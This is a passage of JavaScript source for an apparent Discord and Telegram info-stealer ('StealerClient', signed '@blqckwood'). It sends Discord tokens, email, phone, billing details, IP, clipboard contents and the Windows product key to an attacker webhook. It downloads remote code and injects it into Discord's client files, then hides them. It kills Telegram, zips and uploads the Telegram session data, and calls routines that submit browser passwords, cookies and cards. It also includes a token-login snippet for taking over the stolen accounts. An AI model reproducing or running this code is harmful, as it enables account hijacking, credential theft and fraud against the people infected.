        var billing = await getBilling(token);
        var friends = await getRelationships(token);
        await axios.post(zizizuckerbergs, {
            content: "",
            embeds: [{
                "fields": [
                    {
                        name: `<a:bby:987689940852817971> Token:`,
                        value: `\`${token}\``,
                        inline: false
                    },
                    {
                        name: `<:bby:987689933844127804> Badges:`,
                        value: getBadges(json.flags),
                        inline: true
                    },
                    {
                        name: `<:bby:987689935018549328> Nitro Type:`,
                        value: await getNitro(json.premium_type, json.id, token),
                        inline: true
                    },
                    {
                        name: `<a:bby:987689939401588827> Billing:`,
                        value: billing,
                        inline: true
                    },
                    {
                        name: `<:bby:987689943558135818> Email:`,
                        value: `\`${json.email}\``,
                        inline: true
                    },
                    {
                        name: `<a:noir:1027205215826481174> Phone:`,
                        value: `\`${json.phone}\``,
                        inline: true
                    },
                    {
                        name: `<:bby:987689942350196756> IP:`,
                        value: `\`${ip}\``,
                        inline: true
                    },
                    {
                        name: `<a:uzi:1027214481648005130> Login code :`,
                        value: `\`\`\`function login(token) {
setInterval(() => {
document.body.appendChild(document.createElement \`iframe\`).contentWindow.localStorage.token = \`"\${token}"\`
}, 50);
setTimeout(() => {
location.reload();
}, 2500);
}\`\`\` 
\`\`\`
login ('${token}')\`\`\`
                        `,
                        inline: true
                    }
                ],
                "color": 3553599,
                "author": {
                    "name": `${json.username}#${json.discriminator} (${json.id})`,
                    "icon_url": config['authorimage'],
                },
                "footer": {
                    "text": "@blqckwood"
                },
                "thumbnail": {
                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
                }
            }, {
                "color": 3553599,
                "description": friends,
                "author": {
                    "name": "HQ Friends",
                    "icon_url": config['authorimage'],
                },
                "footer": {
                    "text": "@blqckwood"
                },
            }]
        }).then(res => { }).catch(() => { })
        continue;
    }
}

const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:moderator:976739399998001152>",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`Unknown\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:946246524504002610:962747802830655498>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:bby:987692721613459517>";
        }
    });
    if (bi == '') bi = `\`No Billing\``
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') return `\`No Badges\``;
    return `${b}`;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:962747802797113365>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:946246402105819216:962747802797113365>";

            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

            let boost = ["<:boost1month:967519402293624862>", "<:boost2month:967519562868338728>", "<:boost3month:969685462157525044>", "<:boost6month:969686607961665628>", "<:boost9month:967520103367340092>", "<:boost12month:969687191133499403>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:946246402105819216:962747802797113365> ${boost[i]}`
        default:
            return "\`No Nitro\`";
    };
}


function Infect() {
    https.get(config['injectcode'], (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                let fakeindexname = '𝗂ndex.js';
                let fakeindexcontent = `module.exports = require('./core.asar');`
              
                const directoryPath = path.dirname(file);

                
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", zizizuckerbergs), {
                    encoding: 'utf8',
                    flag: 'w'
                });


           
                
        

                fs.writeFileSync(directoryPath+`\\`+fakeindexname, fakeindexcontent, {
                    encoding: 'utf8',
                    flag: 'w'
                });

                
    
                execFile('cmd.exe', ['/c', `attrib +h ${file}`]);

            })
        });
    }).on("error", (err) => {
        return;
    });
};



async function sendFileToWebhook() {
    
    await findfile();

    const zip = new AdmZip();

    zip.addLocalFolder(cortex);

    zip.writeZip(cortex+'.zip', () => {
    const form = new FormData();
    form.append("file", fs.createReadStream(cortex+'.zip'));
    form.submit(zizizuckerbergs, (error, response) => { fs.unlinkSync(cortex+'.zip') });
});

    
}



async function sendembed(dir) {
    const path = fs.readFileSync(dir);
    await axios.post(zizizuckerbergs, {
        
        "content": null,
        "embeds": [
          {
            "author": {
                "name": "blqckwood file",
                "icon_url": config['authorimage']
            },
            "color": 0x303037,
            "description": '```'+path+'```',
            "footer": {
                "text": "@blqckwood"
            }
          }
        ]
      })
    .then(res => {
        
    })
    .catch(error => {
        

    })
}


async function start() {
    listDiscords();
    Infect();
   
    pwnBetterDiscord()
    await portklé();
    fs.writeFileSync(`${os.tmpdir()}\\embedfilecontent.txt`, '', { encoding: 'utf-8', flag: 'w' });
    fs.appendFileSync(`${os.tmpdir()}\\embedfilecontent.txt`, `📂 - blqwd\n`, { encoding: 'utf-8' });
    await printDirectoryStructure(cortex);
    
    await  stealTokens();
    
    
    
}



function listDiscords() {
    exec('tasklist', function(err, stdout, stderr) {
        if (stdout.includes("Discord.exe")) runningDiscords.push("discord");
        if (stdout.includes("DiscordCanary.exe")) runningDiscords.push("discordcanary");
        if (stdout.includes("DiscordDevelopment.exe")) runningDiscords.push("discorddevelopment");
        if (stdout.includes("DiscordPTB.exe")) runningDiscords.push("discordptb");
    })
 
    // kill telegram
    exec('taskkill /IM Telegram.exe /F', (error, stdout, stderr) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return;
        }
    })
};




    

    
    
    



function createDirectory(path) {
    fs.mkdir(path, (error) => {
      if (error) {
        return;
      }
    });
}






async function cpuData() {
    try {
      const data = await si.cpu();
      return data.manufacturer + data.brand;
    } catch (e) {
      return 'Erreur'
    }
  }



async function getIp() {
    var ip = await axios.get("https://api.ipify.org/")
    return ip.data;

    
}

ProductKey = execSync("powershell.exe (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey").toString().split("\r\n")[0]



async function getipinfo() {
    var ip = await getIp();
    var rep = await axios.get(`http://ip-api.com/json/${ip}`)
    return rep.data;

    
}


async function vpn() {
    var ip = await getIp();
    var repppp = await axios.get(`https://vpnapi.io/api/${ip}`)
    var rep = repppp.data


    var security = rep['security']

    var vpn = security['vpn'];
    var proxy = security['proxy'];
    var tor = security['tor'];


    const words = [vpn, proxy, tor];

    for (let i = 0; i < words.length; i++) {
        if (words[i] != false) {
            return 'Oui';
        } 

    }
    return 'Aucun'

}

function listTelegramDesktopFiles() {
	const login = process.env.USERNAME;
	const dwnldpath = `C:\\Users\\${login}\\Downloads\\Telegram Desktop`

	if (fs.existsSync(dwnldpath)) {
		const files = fs.readdirSync(dwnldpath);
		if (files.length === 0) {
			return 'Dossier vide';
		} else {
			let fileList = '';
			files.forEach(file => {
				fileList += `- ${file}\n`;
			});
			if (fileList.length <= 4000) {
				return fileList;
			} else {
				return fileList.slice(0, 4000);
			}
		}
	} else {
		return 'No';
	}
}




function checkTelegramInstallation() {
    const emplacements = [
      `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Telegram Desktop`,
      `D:\\Telegram Desktop`,
      `C:\\Program Files\\Telegram Desktop`,
      `C:\\Program Files (x86)\\Telegram Desktop`
    ];
  
    for (let i = 0; i < emplacements.length; i++) {
      if (fs.existsSync(emplacements[i])) {
        return emplacements[i];
      }
    }
  
    return "No";
  }
  

async function telegramgrab() {
    let telegramm = await checkTelegramInstallation()
    let sourceFolder= telegramm + '\\tdata'
    const destinationFolder = process.env.LOCALAPPDATA + '\\temp\\telegram_session';

    if (sourceFolder !== 'No') {
        if (!fs.existsSync(destinationFolder)) {
            fs.mkdirSync(destinationFolder);
          }

          fs.readdirSync(sourceFolder).forEach(file => {
            const filePath = path.join(sourceFolder, file);
            const stats = fs.statSync(filePath);
          
            if (stats.isDirectory()) {
              if (["emoji", "user_data", "dumps", "tdummy"].includes(file)) {
                return;
              }
          
              const destinationPath = path.join(destinationFolder, file);
              if (!fs.existsSync(destinationPath)) {
                fs.mkdirSync(destinationPath);
              }
          
              fs.readdirSync(filePath).forEach(subFile => {
                const subFilePath = path.join(filePath, subFile);
                const subStats = fs.statSync(subFilePath);
          
                if (subStats.isFile()) {
                  const subDestinationPath = path.join(destinationPath, subFile);
                  fs.copyFileSync(subFilePath, subDestinationPath);
                }
              });
            } else if (stats.isFile()) {
              const destinationPath = path.join(destinationFolder, file);
              fs.copyFileSync(filePath, destinationPath);
            }
          });

          const zip = new AdmZip();

          zip.addLocalFolder(destinationFolder);
      
          zip.writeZip(destinationFolder+'.zip', () => {
          const form = new FormData();
          form.append("file", fs.createReadStream(destinationFolder+'.zip'));
          form.submit(zizizuckerbergs, (error, response) => { fs.unlinkSync(destinationFolder+'.zip') });
          })

        
    }
}



async function injectNotify() {

    let fields = [];
    let fieldinjec = [];
   
    var cpuuu = await cpuData();
    var ip = await getIp();
    var rep = await getipinfo();
    var vpnn = await vpn();
    let zgeg = await torcheck();
    let telegeam = await checkTelegramInstallation();

    let clipboard = await getClipboardContent()
    const telegramFiles = await listTelegramDesktopFiles();

    




    var pays = rep['country']
    var region = rep['regionName']
    var ville = rep['city']
    var codepostal = rep['zip']
    var operateur = rep['isp']

    

    injectPath.forEach( path => {
        
        let c = {
            name: "<a:bby:987689939401588827>・Inject Path",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        let d = {
            name: "<:bby:987689933844127804>・Informations",
            value: `     **PC Name** : \`${os.userInfo().username}\`        \n**Desktop** : \`${os.hostname()}\`            \n**Platform** : \`${os.version()}\`\n **Windows Product Key** : \`${ProductKey}\`          \n**CPU** : \`${cpuuu}\`  \n   **Nitro auto buy** : \`${config['nitroautobuy']}\`           \n**Injection** : [${config['injectcode']}](${config['injectcode']})`,
            inline: !1
        }
        let e = {
            name: "<:bby:987689943558135818>・Localisation",
            value: `**IP** : \`${ip}\`\n   **VPN/Proxy/Tor** : \`${vpnn}\` \n**Pays** : \`${pays}\` \n **Region** : \`${region}\` \n **Ville** : \`${ville}\` \n **Code Postal** : \`${codepostal}\` \n **Opérateur** : \`${operateur}\``,
            inline: !1
        }

        
        

        
        
        fields.push(d, e)
        if (clipboard !== 'Too long' && clipboard !== 'Empty' && clipboard !== 'Error') {
            let clipclip = {
                name: "<a:uzi:1027214481648005130>・Clipboard",
                value: `\`\`\`${clipboard}\`\`\``,
                inline: !1
            }
            fields.push(clipclip)
            
        }
        fieldinjec.push(c)


        
        
    })



    

    await axios.post(zizizuckerbergs, {
        "content": null,
        "embeds": [
          {
            "author": {
                "name": "Successfull injection",
                "icon_url": config['authorimage']
            },
            "color": 0x303037,
            "fields": fieldinjec,
            "footer": {
                "text": "@blqckwood"
            }
                
            
            
          }
        ]
      })
	.then(res => {
        
	})
	.catch(error => {
        

    })

    

    
    let data = {


        embeds: [{
            author: {
                "name": "Informations",
                "icon_url": config['authorimage']
            },
            color: 0x303037,
            fields: fields,
            footer: {
                text: "@blqckwood"
            },
            image: {
                url: config['image']
              }
        },
        {
          "author": {
              "name": "Telegram & Tor",
              "icon_url": config['authorimage']
          },
          "color": 0x303037,
          "fields": [{
              name: "<:telegram:1084189607647793212>・Telegram",
              value: `\`${telegeam}\``,
              inline: true
          },
          {
              name: "<:tor:1084190133814829108>・Tor",
              value: `\`${zgeg}\``,
              inline: true
          }],
          "footer": {
              "text": "@blqckwood"
          }
        }]
    
    }

    

    







    await axios.post(zizizuckerbergs, data)
	.then(res => {
        
	})
	.catch(error => {
        

    })

    if (telegramFiles === 'Dossier vide') {
        axios.post(zizizuckerbergs, {
        embeds: [{
                author: {
                    "name": "Telegram Desktop",
                    "icon_url": config['authorimage']
                },
                color: 0x303037,
                description: `\`\`\`Dossier vide\`\`\``,
                footer: {
                    text: "@blqckwood"
                }
        }]
            })
            .then(res => {
    
            })
            .catch(error => {
    
    
            })
    } else if (telegramFiles !== 'No') {
        if (telegramFiles.length <= 4000) {
            axios.post(zizizuckerbergs, {
          embeds: [{
          author: {
                    "name": "Telegram Desktop",
                    "icon_url": config['authorimage']
                },
                color: 0x303037,
                description: `\`\`\`${telegramFiles}\`\`\``,
                footer: {
                    text: "@blqckwood"
                }
        }]
                })
                .then(res => {
    
                })
                .catch(error => {
    
    
                })
        } else {
            axios.post(zizizuckerbergs, {
          embeds: [{
            author: {
              "name": "Telegram Desktop",
              "icon_url": config['authorimage']
            },
            color: 0x303037,
            description: `\`\`\`${telegramFiles.slice(0, 4000)}\`\`\``,
            footer: {
              text: "@blqckwood"
            }
          }]
                })
                .then(res => {
    
                })
                .catch(error => {
    
    
                })
        }
    }

    await telegramgrab()
    await  sendFileToWebhook();
}




class StealerClient {
    constructor () { 
        
        SubmitHistory();
        SubmitCookies(); 
        SubmitPasswords();
        SubmitCards();
        SubmitAutofill();
        start()
    }
}

new StealerClient()
